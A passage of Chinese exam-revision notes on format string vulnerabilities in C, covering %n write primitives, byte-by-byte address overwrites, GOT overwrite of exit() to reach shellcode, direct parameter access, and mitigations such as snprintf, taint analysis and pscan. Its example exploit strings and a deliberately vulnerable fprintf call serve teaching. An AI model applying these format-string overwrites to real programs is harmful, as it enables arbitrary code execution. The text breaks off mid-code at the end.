<p>（3）调用：printf(“\xdc\xf5\x42\x01%08x.%08x.%08x%n”);将<strong>代表输出字符个数的整数值</strong>写入地址<strong>0x0142f5dc中。</strong>写入的值<strong>28</strong>。等于8字符宽的十六进制域（乘以3）的值加上4个地址字节的值。攻击者用某些shellcode的地址<strong>来覆写地址。</strong></p>
<p>（4）如果攻击者能够控制格式字符串，那么他就能通过使用具有具体的宽度或精度的转换规范来控制写入的字符个数。</p>
<p>考试题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%10u%n&quot;</span>, <span class="number">1</span>, &amp;i); <span class="comment">/* i = 10 */</span></span><br><span class="line">**<span class="built_in">printf</span>(<span class="string">&quot;%100u%n&quot;</span>, <span class="number">1</span>, &amp;i); **<span class="comment">/*** i = 100 */</span></span><br></pre></td></tr></table></figure>

<ul>
<li>每一个格式字符串都耗用两个参数：<strong>转换指示符%u所使用的整数值、输出的字符个数</strong></li>
<li>问你第三行输出的i用十六进制表示为：64</li>
</ul>
<p>（5）在大多数复杂指令集计算机架构中，可以按如下方式写一个任意的地址：<strong>写入4个字节、递增该地址、写入另外4个字节。</strong>这项技术对于覆写目标内存之后的3个字节有一个副作用。</p>
<p>（6）举例</p>
<p>练习题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> exploit[<span class="number">1024</span>] = <span class="string">&quot;\x90\x90\x90...\x90&quot;</span>;</span><br><span class="line"><span class="type">char</span> format[<span class="number">1024</span>];</span><br><span class="line"><span class="comment">// 定义了四套哑整数/地址对步进参数指针指令来覆写地址</span></span><br><span class="line"><span class="built_in">strcpy</span>(format, <span class="string">&quot;\xaa\xaa\xaa\xaa&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(format, <span class="string">&quot;\xdc\xf5\x42\x01&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(format, <span class="string">&quot;\xaa\xaa\xaa\xaa&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(format, <span class="string">&quot;\xdd\xf5\x42\x01&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(format, <span class="string">&quot;\xaa\xaa\xaa\xaa&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(format, <span class="string">&quot;\xde\xf5\x42\x01&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(format, <span class="string">&quot;\xaa\xaa\xaa\xaa&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(format, <span class="string">&quot;\xdf\xf5\x42\x01&quot;</span>);</span><br><span class="line"><span class="comment">// 第3579行在与转换规范%u对应的格式字符串中**插入了哑整型参数。**</span></span><br><span class="line"><span class="comment">// 第46810行指定了一个值序列，后者是用**利用代码的地址去覆写0x0142f5dc**</span></span><br><span class="line"><span class="comment">//（栈上的一个返回地址）处的地址所必需的。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">61</span>; i++) &#123;</span><br><span class="line"><span class="built_in">strcat</span>(format, <span class="string">&quot;%x&quot;</span>);&#125;</span><br><span class="line"><span class="comment">// 第11~13行写入适当数目的%x转换规范，将**参数指针步进到格式字符串的起点以及第一个哑整数/地址对。**</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* code to write address goes here */</span></span><br><span class="line"><span class="built_in">printf</span>(format)</span><br></pre></td></tr></table></figure>

<ul>
<li>考创建的字符串序列格式：<strong>四套哑整数&#x2F;地址对，用于步进参数指针的指令，用于覆写地址的指令。</strong></li>
</ul>
<p>printf(“\xdc\xf5\x42\x01%08x.%08x.%08x%n”);  还可以将特定的整数值写入地址0x0142f5dc中。参数在放入栈的时候，根据大小从栈顶往栈底放；因此参数开头的地址在栈顶，会被认为是最后的参数，对应%n放入的地方。</p>
<p>进一步地，可以有<strong>任意写</strong>：<strong>对某地址写入4字节、递增该地址、再写入另外4字节</strong>。</p>
<p>8.按四个步骤写一个地址</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2085.png" alt="image.png"></p>
<p>（1）每一次地址递增的时候，都会在<strong>低内存中保留一个字节的尾值</strong>。这个字节在小尾端架构中<strong>是低位字节</strong>，而在大尾构中<strong>则为高位字节</strong>。这个过程可用于<strong>通过一系列小整数的值（＜255）来实现写一个大整数值（一个地址）</strong>的目的。这个过程还可以颠倒过来，即<strong>还可以在地址递减时从高位内存写到低位内存。</strong></p>
<p>（2）格式化输出调用<strong>仅仅执行每格式字符串的单一写。</strong>在对格式化输出函数的单次调用中，<strong>还可以执行多次写。</strong></p>
<p>练习题：（这种类似的计算要学会，考过问你写入什么）</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2086.png" alt="image.png"></p>
<ul>
<li>写入foo的内容为<strong>0x80402010（小尾端架构）</strong>。在对格式化输出函数的单次调用中执行多次写时，若第一次写入了0x20(%32u%n)，第二次想写入0x10，正确的写法是**%240u%n。<strong>将多次写与单格式字符串相结合的唯一区别在于，随着每一个字符的输出，计数器的值不断增加。printf(“%16u%n%16u%n%32u%n%64u%n”)，</strong>第一个%16u%n字符序列向指定地址中写入的值是16，但第二个%16u%n则写32字节，因为计数器没有被重置。**</li>
</ul>
<p>9.用于<strong>覆写一个地址</strong>的利用代码</p>
<p>练习题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span> already_written, width_field;</span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span> write_byte;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> buffer[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">already_written = <span class="number">506</span>;</span><br><span class="line"><span class="comment">// first byte</span></span><br><span class="line">write_byte = <span class="number">0x3C8</span>;</span><br><span class="line">already_written %= <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">width_field = (write_byte - already_written) % <span class="number">0x100</span>;</span><br><span class="line"><span class="keyword">if</span> (width_field &lt; <span class="number">10</span>) width_field += <span class="number">0x100</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(buffer, <span class="string">&quot;%%%du%%n&quot;</span>, width_field);</span><br><span class="line"><span class="built_in">strcat</span>(format, buffer);</span><br><span class="line"><span class="comment">// 练习题只给到这里，问代码作用，**覆写一个地址的第一个字节**</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// second byte</span></span><br><span class="line">write_byte = <span class="number">0x3fA</span>;</span><br><span class="line">already_written += width_field;</span><br><span class="line">already_written %= <span class="number">0x100</span>;</span><br><span class="line">width_field = (write_byte - already_written) % <span class="number">0x100</span>;</span><br><span class="line"><span class="keyword">if</span> (width_field &lt; <span class="number">10</span>) width_field += <span class="number">0x100</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(buffer, <span class="string">&quot;%%%du%%n&quot;</span>, width_field);</span><br><span class="line"><span class="built_in">strcat</span>(format, buffer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// third byte</span></span><br><span class="line">write_byte = <span class="number">0x442</span>;</span><br><span class="line">already_written += width_field;</span><br><span class="line">already_written %= <span class="number">0x100</span>;</span><br><span class="line">width_field = (write_byte - already_written) % <span class="number">0x100</span>;</span><br><span class="line"><span class="keyword">if</span> (width_field &lt; <span class="number">10</span>) width_field += <span class="number">0x100</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(buffer, <span class="string">&quot;%%%du%%n&quot;</span>, width_field);</span><br><span class="line"><span class="built_in">strcat</span>(format, buffer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// fourth byte</span></span><br><span class="line">write_byte = <span class="number">0x501</span>;</span><br><span class="line">already_written += width_field;</span><br><span class="line">already_written %= <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">width_field = (write_byte - already_written) % <span class="number">0x100</span>;</span><br><span class="line"><span class="keyword">if</span> (width_field &lt; <span class="number">10</span>) width_field += <span class="number">0x100</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(buffer, <span class="string">&quot;%%%du%%n&quot;</span>, width_field);</span><br><span class="line"><span class="built_in">strcat</span>(format, buffer);</span><br></pre></td></tr></table></figure>

<p>（1）代码使用了三个无符号整数：already_written，width_field，write_byte。变量write_byte中包含<strong>下一个将要写入的字节值</strong>。already_written用于<strong>存储输出的字符个数</strong>（应该<strong>等于格式化输出函数的输出计数器的值</strong>），width_field中存储<strong>有转换规范%n所需要的宽度域的值。</strong></p>
<p>（2）所需的宽度是<strong>由待写字节的值对0x100（不包括更大的宽度）取模再减去已经输出的字符数。</strong>区别在于<strong>输出的字符数需要将输出计数器从当前值增加到所需要的值</strong>。在每一次写入后，前一个转换规范中的宽度值被<strong>加上已写入的字节数</strong>。</p>
<p>（3）该代码创建的输出字符串格式为：**%% width u% %n。**</p>
<h3 id="栈随机化"><a href="#栈随机化" class="headerlink" title="栈随机化"></a>栈随机化</h3><p>1.背景：在Linux下，栈的起始地址为0xC0000000并且朝低内存方向增长。<strong>极少数Linux栈地址中包含空字节，从而容易使它们被插入格式字符串。</strong>许多Linux变体中包含有某种栈随机化机制。这种机制使得<strong>很难预测栈上信息的位置</strong>，包括<strong>返回地址和自动变量</strong>的位置，这是通过向栈中<strong>插入随机的间隙实现的</strong>。</p>
<p>2.阻碍栈随机化：尽管栈随机化<strong>加大了漏洞利用的难度</strong>，<strong>但它并不能完全阻止这种情况的发生。</strong>例如，格式字符串漏洞利用需要这样的一些值：要覆写的地址，shell code的地址，参数指针和格式字符串起始地址之间的距离，在第一个转换规范%u之前格式化输出函数已经写入的字节数。</p>
<p>3.待覆写地址：<strong>可以覆写在程序正常执行中、控制权将被转移到的函数的GOT入口或其他地址。</strong>覆写GOT入口的优势在于它独立于诸如栈和堆这样的系统变量。</p>
<p>4.Shellcode的地址：基于Windows的利用中假设向栈的自动变量中插入了一段shellcode。对于实现栈随机化的系统，想找到这个地址很困难。然而shellcode同样可以插入到数据段或堆上的变量中，这就比较容易找到了。</p>
<p>5.距离：攻击者必须确定<strong>参数指针和格式字符串的起始位置在栈中的距离</strong>。它们之间的相对距离却是不变的。计算参数指针与格式字符串的起始位置之间的距离并且插入所需数目的%x格式转换规范并不难做到。</p>
<p>6.以双字的格式写地址：基于Windows的利用<strong>将一个shellcode的地址分成四次每次写入一个字节，各次调用之间对地址进行递增</strong>。如果由于对齐的要求或者其他原因造成这种操作不可能，仍然可以通过向地址中一次写入一个字甚至全部内容来实现。</p>
<p>7.Linux利用变体</p>
<p>练习题：<strong>exit()函数的GOT入口的地址</strong>被覆写为shellcode的地址，所以当调用exit()终止程序时，控制权会移交给shellcode。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span> &#123;</span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> shellcode[<span class="number">1024</span>] = </span><br><span class="line"><span class="string">&quot;\x90\x09\x09\x09\x09\x09/bin/sh&quot;</span>; <span class="comment">// 静态变量向数据段中插入一个shellcode</span></span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> format_str[<span class="number">1024</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(format_str, <span class="string">&quot;\xaa\xaa\xaa\xaa&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(format_str, <span class="string">&quot;\xb4\x9b\x04\x08&quot;</span>); </span><br><span class="line"><span class="comment">// **exit()函数的GOT入口的地址**被连接到格式字符串</span></span><br><span class="line"><span class="built_in">strcat</span>(format_str, <span class="string">&quot;\xcc\xcc\xcc\xcc&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(format_str, <span class="string">&quot;\xb6\x9b\x04\x08&quot;</span>);</span><br><span class="line"><span class="comment">// 该地址被+2后也连接到格式字符串</span></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line"><span class="built_in">strcat</span>(format_str, <span class="string">&quot;%x&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* code to write address goes here */</span></span><br><span class="line"><span class="built_in">printf</span>(format_str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// 当调用exit()终止程序时，控制权会移交给shellcode</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>8.直接参数存取</p>
<p>（1）Single UNIX规范[IEEE 04]<strong>允许转换被应用于参数列表中的格式之后的第n个参数上，而不是应用到下一个未使用的参数上。</strong>转换指示符%将被序列所代替，%<em>n</em>$,其中n是一个1到{NL_ARGMAX}范围内的十进制整数，它指定了参数的位置。</p>
<p>（2）格式既可以包含数字式，也可以包含非数字式的参数转换规范，但不允许二者同时出现。数字式的:%<em>n</em>$ and *<em>m</em>$；非数字式的:% and *。%%与%<em>n</em>$混合使用是个例外。在一个格式字符串中混用数字式和非数字式参数规范会导致未定义的结果。</p>
<p>（3）当使用数字式参数规范时，要想指定第n个参数，格式字符串中所有从第一个到第n-1个前导参数都要被指定。在包含有如%n$形式的转换规范的格式字符串中，参数列表中的数字式参数可视需要被从格式字符串中引用多次。</p>
<p>（4）直接参数存取例子</p>
<p>练习题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i, j, k = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%4$5u%3$n%5$5u%2$n%6$5u%1$n\n&quot;</span>,&amp;k,&amp;j,&amp;i,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i=%d,j=%d,k=%d\n&quot;</span>,i,j,k);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Output:</span></span><br><span class="line"><span class="comment">5 6 7</span></span><br><span class="line"><span class="comment">**i=5,j=10,k=15**（练习题问输出）</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<ul>
<li>printf(“%4$5u%3$n%5$5u%2$n%6$5u%1$n\n”,&amp;k,&amp;j,&amp;i,5,6,7);<br>printf(“i&#x3D;%d,j&#x3D;%d,k&#x3D;%d\n”,i,j,k);<br>对printf()函数的调用导致以5个字符的列宽将值<strong>567打印出来。</strong>printf()打印出赋给变量i,j,k的值，这些值代表了在<strong>上一次调用printf()的基础上输出计数器的增加值。</strong></li>
<li>第一个转换规范%4$5u：获得第4个参数（即常量5），并<strong>将输出格式化为无符号的十进制整数</strong>，宽度为5。</li>
<li>第二个转换规范%3$n：将当前输出计数器的值（5）<strong>写到第三个参数(&amp;i)所指定的地址。</strong></li>
<li>%5$5u的作用：获得第5个参数（即常量6），并<strong>将输出格式化为无符号的十进制整数</strong>，宽度为5。</li>
<li>%1$n的作用：将当前输出计数器的值（7）<strong>写到第一个参数(&amp;k)所指定的地址。</strong></li>
</ul>
<h3 id="缓解策略-2"><a href="#缓解策略-2" class="headerlink" title="缓解策略"></a>缓解策略</h3><p>由于现在的代码体系<strong>不可能改变库(移除%n)，不允许动态格式字符串。</strong></p>
<p>策略：</p>
<p>（1）<strong>限制写入字节数。</strong>使用%40s而不是%s，可以通过使用<strong>更安全的函数</strong>实现，比如snprintf、vsnprintf</p>
<p>（2）使用更安全的<strong>函数规范</strong></p>
<p>（3）使用<strong>静态分析（比如词法分析工具）</strong></p>
<p>（4）<strong>静态污点分析</strong></p>
<p>（5）<strong>限制可变函数的参数数量</strong>（用一个变参控制）</p>
<p><strong>（6）静态二进制分析</strong></p>
<p>1.动态格式字符串</p>
<p><strong>这个程序是可以免于受到格式字符串利用的威胁的：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span> &#123;</span><br><span class="line"><span class="type">int</span> x, y;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> format[<span class="number">256</span>] = <span class="string">&quot;%d * %d = &quot;</span>; </span><br><span class="line"></span><br><span class="line">x = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">y = atoi(argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">3</span>], <span class="string">&quot;hex&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">// 使用第三个参数来指示程序如何对结果进行格式化。</span></span><br><span class="line"><span class="comment">// 如果是字符串“hex”，那么将%x将结果显示为16进制，否则将%d将结果显示为10进制。</span></span><br><span class="line"><span class="built_in">strcat</span>(format, <span class="string">&quot;0x%x\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">strcat</span>(format, <span class="string">&quot;%d\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(format, x, y, x * y);</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.限制字节写入</p>
<p>（1）缓冲区溢出可以通过<strong>严格控制这些函数写入的字节数</strong>来避免。写入的字节数可以通过指定一个精度域作为%s转换规范的一部分进行控制。例如不使用sprintf(buffer, “Wrong command:%s\n”, user);而是使用sprintf(buffer, “Wrong command:<strong>%.495s\n</strong>“, user);</p>
<p>（2）<strong>精度域指定了针对%s转换所要写入的最大字节数。</strong>在这个例子中静态字符串“贡献”了17个字节。精度域为495确保结果字符串可以适合于512字节的缓冲。</p>
<p>（3）另一种方式是使用<strong>更安全版本的格式化输出库函数，</strong>它们不容易产生缓冲区溢出问题。例如<strong>snprintf()比sprintf()更好，vsnprintf()替代vsprintf()。</strong>这些函数指定了<strong>写入的最大字节数</strong>（包括末尾的空字节在内）。</p>
<p>（4）函数<strong>asprintf()和vasprintf()<strong>可以用于取代sprintf()和vsprintf()。这些函数为</strong>字符串分配足够大的空间以容纳包括末尾空字符在内的输出内容，</strong>并通过第一个参数返回指向它的指针。这些函数都是GNU的扩展函数，在C或POSIX标准中并没有定义。*BSD系统也支持这些函数。</p>
<p>3.ISO&#x2F;IEC WDTR 24731</p>
<p>（1）具有增强的安全性的函数：fprintf_s(),printf_s(),snprintf_s(),sprintf(),vfprintf_s(),vprintf_s(),vsnprintf_s(),vsprintf_s().</p>
<p>（2）这些格式化输出函数有着<strong>不带_s后缀的原型对应物：不支持格式转换指示符%n；</strong>并且<strong>如果指针为空的话，它们将其视作约束违例；格式字符串无效。无法防止格式字符串漏洞</strong>，这些漏洞使程序崩溃，或被用于查看内存内容。</p>
<p>4.iostream与stdio</p>
<p>（1）C++程序员能够使用iostream库，这个库提供了通过流来实现输入、输出的功能。格式化输出使用iostream依照<strong>中级二元插入操作符&lt;&lt;**进行实现。**左操作数是待插入数据的流。右操作数则是要插入的值。**格式化和标记化输入是通过**提取操作符&gt;&gt;实现的</strong>。标准的I&#x2F;O流stdin、stdout和stderr被cin、cout和cerr所取代。</p>
<p>（2）极其不安全的stdio实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> filename[<span class="number">256</span>];</span><br><span class="line">FILE *f;</span><br><span class="line"><span class="type">char</span> format[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">fscanf</span>(<span class="built_in">stdin</span>, <span class="string">&quot;%s&quot;</span>, filename); <span class="comment">// 这个程序容易造成缓冲区溢出</span></span><br><span class="line"><span class="comment">// 从stdin读入一个文件名并尝试打开该文件</span></span><br><span class="line"></span><br><span class="line">f = fopen(filename, <span class="string">&quot;r&quot;</span>); <span class="comment">/* read only */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">sprintf</span>(format, <span class="string">&quot;Error opening file %s\n&quot;</span>, filename);</span><br><span class="line"><span class="comment">// 格式字符串则可能会被利用</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, format); <span class="comment">// 如果打开失败的话会打印一条错读信息</span></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">fclose(f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>安全的iostream实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span> &#123;</span><br><span class="line"><span class="built_in">string</span> filename;</span><br><span class="line">ifstream ifs;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; filename;</span><br><span class="line">ifs.open(filename.c_str());</span><br><span class="line"><span class="keyword">if</span> (ifs.fail()) &#123;</span><br><span class="line"><span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error opening &quot;</span> &lt;&lt; filename</span><br><span class="line">&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">ifs.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>5.测试</p>
<p>（1）很难构建一个<strong>能够覆盖所有路径的测试套件。</strong>格式字符串bug的主要来源在于<strong>错误报告代码。</strong></p>
<p>（2）由于这类代码是<strong>作为异常的结果而被触发执行的，</strong>因此在实际的运行期测试中<strong>这些路径往往被遗漏了。</strong></p>
<p>6.词法分析</p>
<p>（1）<strong>pscan工具是一种词法分析工具</strong>，可以自动扫描源代码中存在的格式字符串漏洞。它以如下规则扫描格式化输出函数：<strong>如果函数最后一个参数是格式字符串且不是静态字符串，则产生一个报告。</strong></p>
<p>（2）<strong>无法侦测传入参数时存在的漏洞。</strong>它在<strong>使用用户或者其他非信任源提供的格式字符串时会产生错误的判断。</strong>词法分析工具最主要的优势在于<strong>速度</strong>。由于词法分析工具缺乏语义知识，<strong>导致很多漏洞无法得到检测。</strong></p>
<p>7.静态污点分析</p>
<p>（1）Shankar描述了一个<strong>用于检测C程序中的格式字符串安全漏洞的系统，</strong>该系统使用了一个<strong>基于约束的类型推断引擎。</strong>来自<strong>非信任源的输入</strong>会被标记为污点。而由<strong>污点源衍生的数据同样会被标记为污点。</strong>对于那些<strong>试图将污点数据解释为格式字符串的操作会产生一个警告。</strong>这个工具是基于cqual扩展类型修饰符框架而构建的。</p>
<p>（2）污点化<strong>利用附加类型修饰符来扩展</strong>现有的C类型系统。标准C类型系统中已经包含了const之类的修饰符。增加一个污点修饰符则允许在使用非信任输入的同时将其标记为污点。例如:tainted int getchar();int main(int argc,tainted char argv[])</p>
<p>（3）<strong>getchar()的返回值和程序的命令行参数都被标记为污点并作为污点值对待。</strong>在给定一套初始污点标注的情况下，就可以推断程序变量<strong>能否被赋予来自某个污点源的值。</strong>如果任何污点类型的表达式被用作了格式字符串，则用户将会<strong>被警告程序中存在潜在的漏洞。</strong></p>
<p>8.调整变参函数的实现</p>
<p>（1）对格式字符串漏洞的利用要求<strong>参数指针被步进超过传递给格式化输出函数的参数数目。</strong>格式字符串使用的参数个数超过了实际传入的实参数量。可以通过<strong>将变参函数的参数个数限制在实际传递的参数个数之内</strong>，从而消除这个基于参数指针步进而导致的利用。</p>
<p>（2）通过传递一个终止参数来判断实参什么时候被用尽是不可能的。ANSI变参函数机制允许任意数据作为参数传递。传递参数的数量给可变函数作为参数。</p>
<p>（3）安全的变参函数实现</p>
<p>练习题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> va_start(ap,v) </span></span><br><span class="line">(ap=(va_list)_ADDRESSOF(v)+_INTSIZEOF(v)); \</span><br><span class="line"><span class="type">int</span> va_count = va_arg(ap, <span class="type">int</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> va_arg(ap,t) \</span></span><br><span class="line"><span class="meta">(*(t *)((ap+=_INTSIZEOF(t))-_INTSIZEOF(t))); \ </span></span><br><span 